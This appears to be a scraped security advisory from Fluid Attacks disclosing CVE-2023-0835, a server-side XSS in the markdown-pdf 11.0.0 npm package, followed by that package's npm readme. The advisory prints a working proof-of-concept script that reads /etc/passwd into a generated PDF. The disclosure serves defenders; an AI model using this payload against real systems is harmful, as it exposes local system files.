=== Content from fluidattacks.com_df770c73_20250115_082530.html ===
[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# markdown-pdf 11.0.0 - Local File Read via Server Side XSS

## Summary

|  |  |
| --- | --- |
| **Name** | markdown-pdf 11.0.0 - Local File Read |
| **Code name** | [RelsB](https://en.wikipedia.org/wiki/Rels_B) |
| **Product** | markdown-pdf |
| **Affected versions** | Version 11.0.0 |
|
| **State** | Public |
| **Release date** | 2023-04-10 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Server Side XSS |
| **Rule** | [425. Server Side XSS](https://docs.fluidattacks.com/criteria/vulnerabilities/425) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **CVSSv3.1 Base Score** | 7.5 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2023-0835](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0835) |

## Description

markdown-pdf version 11.0.0 allows an external attacker to remotely obtain
arbitrary local files. This is possible because the application does not
validate the Markdown content entered by the user.

## Vulnerability

This vulnerability occurs because the application does not validate that
the Markdown content entered by the user is not malicious.

## Exploitation

To exploit this vulnerability, we only need to send the following malicious
Markdown to markdown-pdf:

### Exploit.md

```
<script>
 // Path Disclosure
 document.write(window.location);
 // Arbitrary Local File Read
 xhr = new XMLHttpRequest;
 xhr.onload=function(){document.write((this.responseText))};
 xhr.open("GET","file:///etc/passwd");
 xhr.send();
</script>

```

Thus, when markdown-pdf parses the malicious Markdown, it will return the local
file specified in the generated PDF.

## Evidence of exploitation

![LFR-Node-PDF](https://user-images.githubusercontent.com/51862990/220176263-ca40f665-e82b-4521-8c86-42d76d7596be.png)

## Our security policy

We have reserved the ID CVE-2023-0835 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: electron-pdf 11.0.0
* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.npmjs.com/package/markdown-pdf/>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-02-20

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-02-20

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-02-20

Vendor replied acknowledging the report.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-04-10

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)



=== Content from www.npmjs.com_32fc3eda_20250115_082531.html ===

skip to:[content](#main)[package search](#search)[sign in](#signin)â¤

* [Pro](/products/pro)
* [Teams](/products/teams)
* [Pricing](/products)
* [Documentation](https://docs.npmjs.com)
npmSearch[Sign Up](/signup)[Sign In](/login)
## markdown-pdf[DefinitelyTyped icon, indicating that this package has TypeScript declarations provided by the separate @types/markdown-pdf package](/package/%40types/markdown-pdf)

11.0.0Â â¢Â PublicÂ â¢Â Published 3 years ago

* [Readme](?activeTab=readme)
* [Code Beta](?activeTab=code)
* [9 Dependencies](?activeTab=dependencies)
* [47 Dependents](?activeTab=dependents)
* [38 Versions](?activeTab=versions)

# markdown-pdf [Build Status](https://travis-ci.org/alanshaw/markdown-pdf) [Dependency Status](https://david-dm.org/alanshaw/markdown-pdf) [Coverage Status](https://coveralls.io/r/alanshaw/markdown-pdf?branch=master)

Node module that converts Markdown files to PDFs.

The PDF looks great because it is styled by HTML5 Boilerplate. What? - Yes! Your Markdown is first converted to HTML, then pushed into the HTML5 Boilerplate `index.html`. Phantomjs renders the page and saves it to a PDF. You can even customise the style of the PDF by passing an optional path to your CSS *and* you can pre-process your markdown file before it is converted to a PDF by passing in a pre-processing function, for templating.

## Install

```
npm install -g markdown-pdf --ignore-scripts
```

Note: elevated (sudo) permissions may be needed for `npm install -g`

## Usage

```
Usage: markdown-pdf [options] <markdown-file-path>

Options:

  -h, --help                             output usage information
  -V, --version                          output the version number
  <markdown-file-path>                   Path of the markdown file to convert
  -c, --cwd [path]                       Current working directory
  -p, --phantom-path [path]              Path to phantom binary
  -h, --runnings-path [path]             Path to runnings (header, footer)
  -s, --css-path [path]                  Path to custom CSS file
  -z, --highlight-css-path [path]        Path to custom highlight-CSS file
  -m, --remarkable-options [json]        Options to pass to Remarkable
  -f, --paper-format [format]            'A3', 'A4', 'A5', 'Legal', 'Letter' or 'Tabloid'
  -r, --paper-orientation [orientation]  'portrait' or 'landscape'
  -b, --paper-border [measurement]       Supported dimension units are: 'mm', 'cm', 'in', 'px'
  -d, --render-delay [millis]            Delay before rendering the PDF
  -t, --load-timeout [millis]            Timeout before the page is rendered in case `page.onLoadFinished` isn't fired
  -o, --out [path]                       Path of where to save the PDF

```

`markdown-pdf` can also be used programmatically:

```
var markdownpdf = require("markdown-pdf")
  , fs = require("fs")

fs.createReadStream("/path/to/document.md")
  .pipe(markdownpdf())
  .pipe(fs.createWriteStream("/path/to/document.pdf"))

// --- OR ---

markdownpdf().from("/path/to/document.md").to("/path/to/document.pdf", function () {
  console.log("Done")
})
```
### Options

Pass an options object (`markdownpdf({/* options */})`) to configure the output.

#### options.cwd

Type: `String`
Default value: `process.cwd()`

Current working directory.

#### options.phantomPath

Type: `String`
Default value: Path provided by phantomjs module

Path to the phantomjs binary.

#### options.cssPath

Type: `String`
Default value: `[module path]/markdown-pdf/css/pdf.css`

Path to custom CSS file, relative to the current directory.

#### options.highlightCssPath

Type: `String`
Default value: `[module path]/markdown-pdf/css/highlight.css`

Path to custom highlight CSS file (for code highlighting with [highlight.js](https://highlightjs.org)), relative to the current directory.

#### options.paperFormat

Type: `String`
Default value: `A4`

'A3', 'A4', 'A5', 'Legal', 'Letter' or 'Tabloid'.

#### options.paperOrientation

Type: `String`
Default value: `portrait`

'portrait' or 'landscape'.

#### options.paperBorder

Type: `String`
Default value: `2cm`

Supported dimension units are: 'mm', 'cm', 'in', 'px'

#### options.runningsPath

Type: `String`
Default value: `runnings.js`

Path to CommonJS module which sets the page header and footer (see [runnings.js](https://github.com/alanshaw/markdown-pdf/blob/HEAD/runnings.js)).

#### options.renderDelay

Type: `Number`
Default value: Time until [`page.onLoadFinished`](http://phantomjs.org/api/webpage/handler/on-load-finished.html) event fired

Delay (in ms) before the PDF is rendered.

#### options.loadTimeout

Type: `Number`
Default value: `10000`

If `renderDelay` option isn't set, this is the timeout (in ms) before the page is rendered in case the `page.onLoadFinished` event doesn't fire.

#### options.preProcessMd

Type: `Function`
Default value: `function () { return through() }`

A function that returns a [through2 stream](https://npmjs.org/package/through2) that transforms the markdown before it is converted to HTML.

#### options.preProcessHtml

Type: `Function`
Default value: `function () { return through() }`

A function that returns a [through2 stream](https://npmjs.org/package/through2) that transforms the HTML before it is converted to PDF.

#### options.remarkable

Type: `object`
Default value: `{ breaks: true }`

A config object that is passed to [remarkable](https://www.npmjs.com/package/remarkable#options), the underlying markdown parser.

##### options.remarkable.preset

Type: `String`
Default value: `default`

Use remarkable [presets](https://www.npmjs.com/package/remarkable#presets) as a convenience to quickly enable/disable active syntax rules and options for common use cases.

Supported values are `default`, `commonmark` and `full`

##### options.remarkable.plugins

Type: `Array` of remarkable-plugin `Function`s
Default value: `[]`

An array of Remarkable plugin functions, that extend the markdown parser functionality.

##### options.remarkable.syntax

Type: `Array` of optional remarkable syntax `Strings`s
Default value: `[]`

An array of [optional Remarkable syntax extensions](https://github.com/jonschlinkert/remarkable#syntax-extensions), disabled by default, that extend the markdown parser functionality.

## API

### from.path(path, opts) / from(path, opts)

Create a readable stream from `path` and pipe to markdown-pdf. `path` can be a single path or array of paths.

### from.string(string)

Create a readable stream from `string` and pipe to markdown-pdf. `string` can be a single string or array of strings.

### concat.from.paths(paths, opts)

Create and concatenate readable streams from `paths` and pipe to markdown-pdf.

### concat.from.strings(strings, opts)

Create and concatenate readable streams from `strings` and pipe to markdown-pdf.

### to.path(path, cb) / to(path, cb)

Create a writeable stream to `path` and pipe output from markdown-pdf to it. `path` can be a single path, or array of output paths if you specified an array of inputs. The callback function `cb` will be invoked when data has finished being written.

### to.buffer(opts, cb)

Create a [concat-stream](https://npmjs.org/package/concat-stream) and pipe output from markdown-pdf to it. The callback function `cb` will be invoked when the buffer has been created.

### to.string(opts, cb)

Create a [concat-stream](https://npmjs.org/package/concat-stream) and pipe output from markdown-pdf to it. The callback function `cb` will be invoked when the string has been created.

## More examples

### From string to path

```
var markdownpdf = require("markdown-pdf")

var md = "foo===\n* bar\n* baz\n\nLorem ipsum dolor sit"
  , outputPath = "/path/to/doc.pdf"

markdownpdf().from.string(md).to(outputPath, function () {
  console.log("Created", outputPath)
})
```
### From multiple paths to multiple paths

```
var markdownpdf = require("markdown-pdf")

var mdDocs = ["home.md", "about.md", "contact.md"]
  , pdfDocs = mdDocs.map(function (d) { return "out/" + d.replace(".md", ".pdf") })

markdownpdf().from(mdDocs).to(pdfDocs, function () {
  pdfDocs.forEach(function (d) { console.log("Created", d) })
})
```
### Concat from multiple paths to single path

```
var markdownpdf = require("markdown-pdf")

var mdDocs = ["chapter1.md", "chapter2.md", "chapter3.md"]
  , bookPath = "/path/to/book.pdf"

markdownpdf().concat.from(mdDocs).to(bookPath, function () {
  console.log("Created", bookPath)
})
```
### Transform markdown before conversion

```
var markdownpdf = require("markdown-pdf")
  , split = require("split")
  , through = require("through")
  , duplexer = require("duplexer")

function preProcessMd () {
  // Split the input stream by lines
  var splitter = split()

  // Replace occurences of "foo" with "bar"
  var replacer = through(function (data) {
    this.queue(data.replace(/foo/g, "bar") + "\n")
  })

  splitter.pipe(replacer)
  return duplexer(splitter, replacer)
}

markdownpdf({preProcessMd: preProcessMd})
  .from("/path/to/document.md")
  .to("/path/to/document.pdf", function () { console.log("Done") })
```
### Remarkable options and plugins

Example using [remarkable-classy](https://www.npmjs.com/package/remarkable-classy) plugin:

```
var markdownpdf = require("markdown-pdf")

var options = {
    remarkable: {
        html: true,
        breaks: true,
        plugins: [ require('remarkable-classy') ],
		syntax: [ 'footnote', 'sup', 'sub' ]
    }
}

markdownpdf(options)
  .from("/path/to/document.md")
  .to("/path/to/document.pdf", function () { console.log("Done") })
```
## Contribute

Feel free to dive in! [Open an issue](https://github.com/alanshaw/markdown-pdf/issues/new) or submit PRs.

## License

[MIT](https://github.com/alanshaw/markdown-pdf/blob/HEAD/LICENCE) Â© Alan Shaw

## Readme

### Keywords

* [markdown](/search?q=keywords:markdown)
* [pdf](/search?q=keywords:pdf)
* [convert](/search?q=keywords:convert)
* [template](/search?q=keywords:template)
## Package Sidebar

### Install

`npm i markdown-pdf`

### Repository

[Gitgithub.com/alanshaw/markdown-pdf](https://github.com/alanshaw/markdown-pdf)

### Homepage

[github.com/alanshaw/markdown-pdf](https://github.com/alanshaw/markdown-pdf)

### DownloadsWeekly Downloads

7,353

### Version

11.0.0

### License

MIT

### Unpacked Size

253 kB

### Total Files

45

### Last publish

3 years ago

### Collaborators

* [![alanshaw](/npm-avatar/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdmF0YXJVUkwiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci9lMzZkYzc3MmU0MGRjODIwM2VmOTBmYTk4ZTViM2FkZj9zaXplPTEwMCZkZWZhdWx0PXJldHJvIn0.uTmxMW6ybrjVfeMVb9CxlvKD_PFXDcTHPfEZNXUH5co "alanshaw")](/~alanshaw)
[**Try** on RunKit](https://runkit.com/npm/markdown-pdf)[**Report** malware](/support?inquire=security&security-inquire=malware&package=markdown-pdf&version=11.0.0)
## Footer

### Support

* [Help](https://docs.npmjs.com)
* [Advisories](https://github.com/advisories)
* [Status](http://status.npmjs.org/)
* [Contact npm](/support)
### Company

* [About](/about)
* [Blog](https://github.blog/tag/npm/)
* [Press](/press)
### Terms & Policies

* [Policies](/policies/)
* [Terms of Use](/policies/terms)
* [Code of Conduct](/policies/conduct)
* [Privacy](/policies/privacy)


